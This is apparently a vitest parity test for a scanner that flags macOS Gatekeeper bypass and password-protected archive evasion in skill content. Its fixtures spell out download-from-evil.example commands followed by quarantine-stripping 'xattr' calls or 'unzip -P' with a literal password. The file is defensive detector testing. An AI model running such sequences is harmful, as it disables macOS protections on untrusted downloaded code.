/**
 * SMI-6033 Wave 2 parity test (Gap 5 gatekeeper_bypass + Gap 3 archive_evasion)
 * @module scripts/tests/indexer/security-scanner-edge.archive-gatekeeper
 *
 * A sibling to parity.test.ts (per the plan's explicit "a new
 * clawhavoc-parity.test.ts sibling if the line budget requires" note —
 * parity.test.ts is already 1200+ lines) covering the three mandatory parity
 * layers for these two new detectors:
 *   1. Deno<->Node twin byte-identity for the new/touched twin files
 *      (security-scanner-edge.compound.ts, .archive.ts, and — closing a gap
 *      left uncovered by the prior SMI-6033 Wave 2 fetch-correlation
 *      extraction commit — .fetch-correlation.ts).
 *   2. core<->edge structural EQUALITY for the new weight/coefficient pair.
 *   3. core<->edge BEHAVIORAL fixture parity (TP + FP-control per detector,
 *      run through both SecurityScanner.scan() and scanSkillContent()).
 */
import { describe, it, expect } from 'vitest'
import { readFileSync } from 'node:fs'
import { resolve, dirname } from 'node:path'
import { fileURLToPath } from 'node:url'
import { normalizeWs, isGitCryptEncrypted } from './parity-utils.ts'

const __filename = fileURLToPath(import.meta.url)
const __dirname = dirname(__filename)
// scripts/tests/indexer/security-scanner-edge.archive-gatekeeper.test.ts -> repo root is 3 levels up.
const REPO_ROOT = resolve(__dirname, '..', '..', '..')

const CORE_SCANNER = resolve(REPO_ROOT, 'packages/core/src/security/scanner/SecurityScanner.ts')
const CORE_WEIGHTS = resolve(REPO_ROOT, 'packages/core/src/security/scanner/weights.ts')
const NODE_SCANNER = resolve(REPO_ROOT, 'scripts/indexer/_shared/security-scanner-edge.ts')
const NODE_SCANNER_CONTEXT = resolve(
  REPO_ROOT,
  'scripts/indexer/_shared/security-scanner-edge.context.ts'
)

const DENO_SCANNER_ARCHIVE = resolve(
  REPO_ROOT,
  'supabase/functions/_shared/security-scanner-edge.archive.ts'
)
const NODE_SCANNER_ARCHIVE = resolve(
  REPO_ROOT,
  'scripts/indexer/_shared/security-scanner-edge.archive.ts'
)
const DENO_FETCH_CORRELATION = resolve(
  REPO_ROOT,
  'supabase/functions/_shared/security-scanner-edge.fetch-correlation.ts'
)
const NODE_FETCH_CORRELATION = resolve(
  REPO_ROOT,
  'scripts/indexer/_shared/security-scanner-edge.fetch-correlation.ts'
)

// High-entropy (>3.0 bits/char) so looksLikePlaceholderSecret's entropy floor
// does not itself suppress the fixture as a placeholder.
const REAL_PASSWORD = 'xK9$mQ2vLpZ7bWnR'

describe('Deno <-> Node twin byte-identity (SMI-6033 Wave 2)', () => {
  // security-scanner-edge.compound.ts already has whole-file byte-identity
  // coverage in parity.test.ts; the xattr addition in this wave flows through
  // that same existing assertion (it reads the files live, not a snapshot).

  const denoArchiveEncrypted = isGitCryptEncrypted(DENO_SCANNER_ARCHIVE)
  it.skipIf(denoArchiveEncrypted)(
    'security-scanner-edge.archive.ts twins are byte-identical modulo the @module header line',
    () => {
      const node = normalizeWs(readFileSync(NODE_SCANNER_ARCHIVE, 'utf-8'))
      const deno = readFileSync(DENO_SCANNER_ARCHIVE, 'utf-8').replace(
        '@module _shared/security-scanner-edge.archive',
        '@module scripts/indexer/_shared/security-scanner-edge.archive (Node port)'
      )
      expect(
        node,
        'security-scanner-edge.archive.ts drift between supabase/functions/_shared/ and scripts/indexer/_shared/ twins (beyond the permitted @module line)'
      ).toBe(normalizeWs(deno))
    }
  )

  // Closes a gap: the prior SMI-6033 Wave 2 dispatch that extracted
  // fetch-correlation.ts out of compound.ts did not add byte-identity
  // coverage for the new twin pair — this detector's own correctness depends
  // on that shared correlation logic staying in sync, so pin it here.
  const denoFetchCorrelationEncrypted = isGitCryptEncrypted(DENO_FETCH_CORRELATION)
  it.skipIf(denoFetchCorrelationEncrypted)(
    'security-scanner-edge.fetch-correlation.ts twins are byte-identical modulo the @module header line',
    () => {
      const node = normalizeWs(readFileSync(NODE_FETCH_CORRELATION, 'utf-8'))
      const deno = readFileSync(DENO_FETCH_CORRELATION, 'utf-8').replace(
        '@module _shared/security-scanner-edge.fetch-correlation',
        '@module scripts/indexer/_shared/security-scanner-edge.fetch-correlation (Node port)'
      )
      expect(
        node,
        'security-scanner-edge.fetch-correlation.ts drift between supabase/functions/_shared/ and scripts/indexer/_shared/ twins (beyond the permitted @module line)'
      ).toBe(normalizeWs(deno))
    }
  )
})

describe('core <-> edge gatekeeper_bypass/archive_evasion weight + coefficient equality (SMI-6033 Wave 2)', () => {
  it('gatekeeper_bypass and archive_evasion CATEGORY_WEIGHTS are identical core <-> edge (2.0)', async () => {
    const core = await import(CORE_WEIGHTS)
    const edge = await import(NODE_SCANNER_CONTEXT)
    expect(core.CATEGORY_WEIGHTS.gatekeeper_bypass, 'core gatekeeper_bypass weight').toBe(2.0)
    expect(core.CATEGORY_WEIGHTS.archive_evasion, 'core archive_evasion weight').toBe(2.0)
    expect(
      edge.CATEGORY_WEIGHTS.gatekeeper_bypass,
      'edge gatekeeper_bypass weight has drifted from core'
    ).toBe(core.CATEGORY_WEIGHTS.gatekeeper_bypass)
    expect(
      edge.CATEGORY_WEIGHTS.archive_evasion,
      'edge archive_evasion weight has drifted from core'
    ).toBe(core.CATEGORY_WEIGHTS.archive_evasion)
  })

  // Core does not export its coefficients as a lookup table (inlined literals
  // in calculateRiskScore's weighted sum) — pin edge's data-driven equivalent
  // directly, same as the sensitive_path/typosquat precedent in parity.test.ts.
  it('gatekeeper_bypass and archive_evasion CATEGORY_COEFFICIENTS are 0.4 on edge (matching core SecurityScanner.helpers.ts)', async () => {
    const edge = await import(NODE_SCANNER_CONTEXT)
    expect(edge.CATEGORY_COEFFICIENTS.gatekeeper_bypass).toBe(0.4)
    expect(edge.CATEGORY_COEFFICIENTS.archive_evasion).toBe(0.4)
  })
})

describe('core <-> edge behavioral fixture parity — gatekeeper_bypass (SMI-6033 Wave 2/3, Gap 5)', () => {
  it('correlated xattr -c fires standalone-critical and quarantines on both core and edge', async () => {
    const coreMod = await import(CORE_SCANNER)
    const edgeMod = await import(NODE_SCANNER)
    const scanner = new coreMod.SecurityScanner()
    const content = 'curl -o EvilApp.app https://evil.example/EvilApp.app\nxattr -c EvilApp.app'

    const coreReport = scanner.scan('parity', content)
    const coreFinding = coreReport.findings.find(
      (f: { type: string }) => f.type === 'gatekeeper_bypass'
    )
    const edgeRes = await edgeMod.scanSkillContent(content)
    const edgeFinding = edgeRes.findings.find(
      (f: { type: string }) => f.type === 'gatekeeper_bypass'
    )

    expect(coreFinding, 'core must find gatekeeper_bypass').toBeDefined()
    expect(edgeFinding, 'edge must find gatekeeper_bypass').toBeDefined()
    expect(coreFinding?.severity, 'core severity').toBe('critical')
    expect(edgeFinding?.severity, 'edge severity must match core').toBe(coreFinding?.severity)
    expect(coreReport.passed, 'core must fail (standalone-critical)').toBe(false)
    expect(
      edgeMod.shouldQuarantine(edgeRes),
      `edge must quarantine (riskScore=${edgeRes.riskScore})`
    ).toBe(true)
  })

  it('correlated xattr -d com.apple.quarantine fires standalone-critical on both core and edge', async () => {
    const coreMod = await import(CORE_SCANNER)
    const edgeMod = await import(NODE_SCANNER)
    const scanner = new coreMod.SecurityScanner()
    const content =
      'curl -o EvilApp.app https://evil.example/EvilApp.app\n' +
      'xattr -d com.apple.quarantine EvilApp.app'

    const coreFinding = scanner
      .scan('parity', content)
      .findings.find((f: { type: string }) => f.type === 'gatekeeper_bypass')
    const edgeRes = await edgeMod.scanSkillContent(content)
    const edgeFinding = edgeRes.findings.find(
      (f: { type: string }) => f.type === 'gatekeeper_bypass'
    )

    expect(coreFinding?.severity).toBe('critical')
    expect(edgeFinding?.severity).toBe('critical')
  })

  it('uncorrelated xattr (no fetch anywhere) stays medium on both core and edge, regardless of isHighTrustAuthor', async () => {
    const coreMod = await import(CORE_SCANNER)
    const edgeMod = await import(NODE_SCANNER)
    const scanner = new coreMod.SecurityScanner()
    const content = 'xattr -d com.apple.quarantine /Applications/EvilApp.app'

    const coreFindingDefault = scanner
      .scan('parity', content)
      .findings.find((f: { type: string }) => f.type === 'gatekeeper_bypass')
    const coreFindingTrusted = scanner
      .scan('parity', content, true)
      .findings.find((f: { type: string }) => f.type === 'gatekeeper_bypass')
    const edgeResDefault = await edgeMod.scanSkillContent(content)
    const edgeResTrusted = await edgeMod.scanSkillContent(content, true)
    const edgeFindingDefault = edgeResDefault.findings.find(
      (f: { type: string }) => f.type === 'gatekeeper_bypass'
    )
    const edgeFindingTrusted = edgeResTrusted.findings.find(
      (f: { type: string }) => f.type === 'gatekeeper_bypass'
    )

    expect(coreFindingDefault?.severity).toBe('medium')
    expect(coreFindingTrusted?.severity).toBe('medium')
    expect(edgeFindingDefault?.severity).toBe('medium')
    expect(edgeFindingTrusted?.severity).toBe('medium')
  })

  it('correlated xattr + isHighTrustAuthor:true downgrades to medium on both core and edge (the carve-out)', async () => {
    const coreMod = await import(CORE_SCANNER)
    const edgeMod = await import(NODE_SCANNER)
    const scanner = new coreMod.SecurityScanner()
    const content =
      'curl -o EvilApp.app https://evil.example/EvilApp.app\n' +
      'xattr -d com.apple.quarantine EvilApp.app'

    const coreReport = scanner.scan('parity', content, true)
    const coreFinding = coreReport.findings.find(
      (f: { type: string }) => f.type === 'gatekeeper_bypass'
    )
    const edgeRes = await edgeMod.scanSkillContent(content, true)
    const edgeFinding = edgeRes.findings.find(
      (f: { type: string }) => f.type === 'gatekeeper_bypass'
    )

    expect(coreFinding?.severity, 'core severity').toBe('medium')
    expect(edgeFinding?.severity, 'edge severity must match core').toBe('medium')
    // A lone medium co-signal-eligible finding does not standalone-quarantine.
    expect(coreReport.passed, 'core must not quarantine on the carve-out alone').toBe(true)
    expect(
      edgeMod.shouldQuarantine(edgeRes),
      'edge must not quarantine on the carve-out alone'
    ).toBe(false)
  })

  it('checksum/signature-verification prose near a correlated, non-high-trust xattr does NOT downgrade — stays critical on both core and edge', async () => {
    const coreMod = await import(CORE_SCANNER)
    const edgeMod = await import(NODE_SCANNER)
    const scanner = new coreMod.SecurityScanner()
    const content =
      'curl -o EvilApp.app https://evil.example/EvilApp.app\n' +
      '# Verified checksum: sha256:d34db33fd34db33fd34db33fd34db33fd34db33fd34db33fd34db33fd34db33f\n' +
      'xattr -d com.apple.quarantine EvilApp.app'

    const coreFinding = scanner
      .scan('parity', content)
      .findings.find((f: { type: string }) => f.type === 'gatekeeper_bypass')
    const edgeRes = await edgeMod.scanSkillContent(content)
    const edgeFinding = edgeRes.findings.find(
      (f: { type: string }) => f.type === 'gatekeeper_bypass'
    )

    expect(coreFinding?.severity, 'core severity must stay critical').toBe('critical')
    expect(edgeFinding?.severity, 'edge severity must stay critical').toBe('critical')
  })

  // FP control: reading a DIFFERENT attribute is not a bypass, on either side.
  it('FP: xattr -l (list) produces no gatekeeper_bypass finding on core or edge', async () => {
    const coreMod = await import(CORE_SCANNER)
    const edgeMod = await import(NODE_SCANNER)
    const scanner = new coreMod.SecurityScanner()
    const content = 'xattr -l /Applications/EvilApp.app'

    const coreFinding = scanner
      .scan('parity', content)
      .findings.find((f: { type: string }) => f.type === 'gatekeeper_bypass')
    const edgeRes = await edgeMod.scanSkillContent(content)
    const edgeFinding = edgeRes.findings.find(
      (f: { type: string }) => f.type === 'gatekeeper_bypass'
    )

    expect(coreFinding, 'core must not find gatekeeper_bypass').toBeUndefined()
    expect(edgeFinding, 'edge must not find gatekeeper_bypass').toBeUndefined()
  })

  // Sanity FP control: the existing chmod FP fixtures must not trip the new
  // detector either (it lives in the same compound module as chmod).
  it.each([
    ['chmod 755 ./bin/cli', 'chmod 755 ./bin/cli'],
    ['chmod +x build.sh', 'chmod +x build.sh'],
  ])(
    'FP: unrelated chmod idiom does not trip gatekeeper_bypass on core or edge: %s',
    async (_label, content) => {
      const coreMod = await import(CORE_SCANNER)
      const edgeMod = await import(NODE_SCANNER)
      const scanner = new coreMod.SecurityScanner()
      const coreFinding = scanner
        .scan('parity', content)
        .findings.find((f: { type: string }) => f.type === 'gatekeeper_bypass')
      const edgeRes = await edgeMod.scanSkillContent(content)
      const edgeFinding = edgeRes.findings.find(
        (f: { type: string }) => f.type === 'gatekeeper_bypass'
      )
      expect(coreFinding).toBeUndefined()
      expect(edgeFinding).toBeUndefined()
    }
  )
})

describe('core <-> edge behavioral fixture parity — archive_evasion (SMI-6033 Wave 2, Gap 3)', () => {
  it('inline literal password + correlated fetch fires standalone-critical and quarantines on both core and edge', async () => {
    const coreMod = await import(CORE_SCANNER)
    const edgeMod = await import(NODE_SCANNER)
    const scanner = new coreMod.SecurityScanner()
    const content = `curl -o secret.zip https://evil.example/secret.zip\nunzip -P ${REAL_PASSWORD} secret.zip`

    const coreReport = scanner.scan('parity', content)
    const coreFinding = coreReport.findings.find(
      (f: { type: string }) => f.type === 'archive_evasion'
    )
    const edgeRes = await edgeMod.scanSkillContent(content)
    const edgeFinding = edgeRes.findings.find((f: { type: string }) => f.type === 'archive_evasion')

    expect(coreFinding, 'core must find archive_evasion').toBeDefined()
    expect(edgeFinding, 'edge must find archive_evasion').toBeDefined()
    expect(coreFinding?.severity, 'core severity').toBe('critical')
    expect(edgeFinding?.severity, 'edge severity must match core').toBe(coreFinding?.severity)
    expect(coreReport.passed, 'core must fail (standalone-critical)').toBe(false)
    expect(
      edgeMod.shouldQuarantine(edgeRes),
      `edge must quarantine (riskScore=${edgeRes.riskScore})`
    ).toBe(true)
  })

  it('FP: uncorrelated CLI syntax (no fetch anywhere) stays medium on core and edge', async () => {
    const coreMod = await import(CORE_SCANNER)
    const edgeMod = await import(NODE_SCANNER)
    const scanner = new coreMod.SecurityScanner()
    const content = `unzip -P ${REAL_PASSWORD} secret.zip`

    const coreFinding = scanner
      .scan('parity', content)
      .findings.find((f: { type: string }) => f.type === 'archive_evasion')
    const edgeRes = await edgeMod.scanSkillContent(content)
    const edgeFinding = edgeRes.findings.find((f: { type: string }) => f.type === 'archive_evasion')

    expect(coreFinding?.severity, 'core severity').toBe('medium')
    expect(edgeFinding?.severity, 'edge severity must match core').toBe('medium')
  })

  it('FP: out-of-band $VAR password (correlated CLI usage) stays medium on core and edge', async () => {
    const coreMod = await import(CORE_SCANNER)
    const edgeMod = await import(NODE_SCANNER)
    const scanner = new coreMod.SecurityScanner()
    const content =
      'curl -o secret.zip https://evil.example/secret.zip\nunzip -P $ARCHIVE_PASSWORD secret.zip'

    const coreFinding = scanner
      .scan('parity', content)
      .findings.find((f: { type: string }) => f.type === 'archive_evasion')
    const edgeRes = await edgeMod.scanSkillContent(content)
    const edgeFinding = edgeRes.findings.find((f: { type: string }) => f.type === 'archive_evasion')

    expect(coreFinding?.severity, 'core severity').toBe('medium')
    expect(edgeFinding?.severity, 'edge severity must match core').toBe('medium')
  })

  // SMI-6033 Wave 4 bugfix regression: the SAME out-of-band reference above,
  // just shell-quoted — was misclassified as an inline LITERAL secret because
  // the CLI-arg capture is raw (quotes included) and SHELL_VAR_REF only
  // matched a bare `$VAR`, reaching standalone-critical on both surfaces on a
  // completely benign shell idiom. Pinned here so it can't regress.
  it('FP: quoted out-of-band "$VAR" password (correlated CLI usage) stays medium, not critical, on core and edge', async () => {
    const coreMod = await import(CORE_SCANNER)
    const edgeMod = await import(NODE_SCANNER)
    const scanner = new coreMod.SecurityScanner()
    const content =
      'curl -o secret.zip https://evil.example/secret.zip\nunzip -P "$ARCHIVE_PASSWORD" secret.zip'

    const coreFinding = scanner
      .scan('parity', content)
      .findings.find((f: { type: string }) => f.type === 'archive_evasion')
    const edgeRes = await edgeMod.scanSkillContent(content)
    const edgeFinding = edgeRes.findings.find((f: { type: string }) => f.type === 'archive_evasion')

    expect(coreFinding?.severity, 'core severity').toBe('medium')
    expect(edgeFinding?.severity, 'edge severity must match core').toBe('medium')
  })

  // The plan's explicit FP control: a legitimate licensed-font-pack/asset-pack
  // password mention (prose-only, no CLI syntax, no fetch correlation) must
  // stay medium/advisory, never critical, on both core and edge.
  it('FP: licensed font-pack prose-only password mention stays medium (never critical) on core and edge', async () => {
    const coreMod = await import(CORE_SCANNER)
    const edgeMod = await import(NODE_SCANNER)
    const scanner = new coreMod.SecurityScanner()
    const content =
      'This commercial font pack ships as a password-protected zip archive. ' +
      'Contact support with your license key to receive the password by email.'

    const coreReport = scanner.scan('parity', content)
    const coreFinding = coreReport.findings.find(
      (f: { type: string }) => f.type === 'archive_evasion'
    )
    const edgeRes = await edgeMod.scanSkillContent(content)
    const edgeFinding = edgeRes.findings.find((f: { type: string }) => f.type === 'archive_evasion')

    expect(coreFinding, 'core must find an advisory archive_evasion finding').toBeDefined()
    expect(edgeFinding, 'edge must find an advisory archive_evasion finding').toBeDefined()
    expect(coreFinding?.severity, 'core severity must never be critical').not.toBe('critical')
    expect(edgeFinding?.severity, 'edge severity must never be critical').not.toBe('critical')
    expect(coreReport.passed, 'core must not quarantine on prose-only mention alone').toBe(true)
    expect(
      edgeMod.shouldQuarantine(edgeRes),
      'edge must not quarantine on prose-only mention alone'
    ).toBe(false)
  })
})

// SMI-6033 Wave 3 (adversarial-review fix): the shared fetch-correlation
// utility (security-scanner-edge.fetch-correlation.ts / core's
// SecurityScanner.fetch-correlation.ts) is now DIRECTORY-PATH-AWARE. It used
// to match on the final path segment alone, so a coincidental basename
// collision between two unrelated files supplied the provenance condition
// that makes gatekeeper_bypass / archive_evasion standalone-critical. Core and
// edge carry the identical fix, so both must agree on all of these.
describe('core <-> edge directory-aware fetch-correlation parity (SMI-6033 Wave 3)', () => {
  it('FP: xattr target sharing only a BASENAME with the fetch destination (different dirs) stays medium on core and edge', async () => {
    const coreMod = await import(CORE_SCANNER)
    const edgeMod = await import(NODE_SCANNER)
    const scanner = new coreMod.SecurityScanner()
    const content =
      'curl -o /tmp/Helper.app https://vendor.example/Helper.app\n' +
      'xattr -c ./vendor/other-tool/Helper.app'

    const coreFinding = scanner
      .scan('parity', content)
      .findings.find((f: { type: string }) => f.type === 'gatekeeper_bypass')
    const edgeRes = await edgeMod.scanSkillContent(content)
    const edgeFinding = edgeRes.findings.find(
      (f: { type: string }) => f.type === 'gatekeeper_bypass'
    )

    expect(coreFinding, 'core must still emit the advisory finding').toBeDefined()
    expect(edgeFinding, 'edge must still emit the advisory finding').toBeDefined()
    expect(coreFinding?.severity, 'core severity').toBe('medium')
    expect(edgeFinding?.severity, 'edge severity must match core').toBe(coreFinding?.severity)
  })

  it('TP control: the SAME directory on both sides still correlates -> critical on core and edge', async () => {
    const coreMod = await import(CORE_SCANNER)
    const edgeMod = await import(NODE_SCANNER)
    const scanner = new coreMod.SecurityScanner()
    const content =
      'curl -o /tmp/Helper.app https://vendor.example/Helper.app\nxattr -c /tmp/Helper.app'

    const coreFinding = scanner
      .scan('parity', content)
      .findings.find((f: { type: string }) => f.type === 'gatekeeper_bypass')
    const edgeRes = await edgeMod.scanSkillContent(content)
    const edgeFinding = edgeRes.findings.find(
      (f: { type: string }) => f.type === 'gatekeeper_bypass'
    )

    expect(coreFinding?.severity, 'core severity').toBe('critical')
    expect(edgeFinding?.severity, 'edge severity must match core').toBe(coreFinding?.severity)
  })

  it('TP control: a bare-filename fetch destination still correlates with a full-path xattr target on core and edge', async () => {
    const coreMod = await import(CORE_SCANNER)
    const edgeMod = await import(NODE_SCANNER)
    const scanner = new coreMod.SecurityScanner()
    // `curl -o EvilApp.app` names no directory, so there is no path
    // information to distinguish by — final-segment matching must stand.
    const content =
      'curl -o EvilApp.app https://evil.example/EvilApp.app\nxattr -c /Applications/EvilApp.app'

    const coreFinding = scanner
      .scan('parity', content)
      .findings.find((f: { type: string }) => f.type === 'gatekeeper_bypass')
    const edgeRes = await edgeMod.scanSkillContent(content)
    const edgeFinding = edgeRes.findings.find(
      (f: { type: string }) => f.type === 'gatekeeper_bypass'
    )

    expect(coreFinding?.severity, 'core severity').toBe('critical')
    expect(edgeFinding?.severity, 'edge severity must match core').toBe(coreFinding?.severity)
  })

  it('FP: archive target sharing only a BASENAME with the fetch destination (different dirs) stays medium on core and edge', async () => {
    const coreMod = await import(CORE_SCANNER)
    const edgeMod = await import(NODE_SCANNER)
    const scanner = new coreMod.SecurityScanner()
    const content =
      'curl -o /tmp/assets.zip https://vendor.example/assets.zip\n' +
      `unzip -P ${REAL_PASSWORD} ./vendor/font-pack/assets.zip`

    const coreFinding = scanner
      .scan('parity', content)
      .findings.find((f: { type: string }) => f.type === 'archive_evasion')
    const edgeRes = await edgeMod.scanSkillContent(content)
    const edgeFinding = edgeRes.findings.find((f: { type: string }) => f.type === 'archive_evasion')

    expect(coreFinding?.severity, 'core severity').toBe('medium')
    expect(edgeFinding?.severity, 'edge severity must match core').toBe(coreFinding?.severity)
  })
})
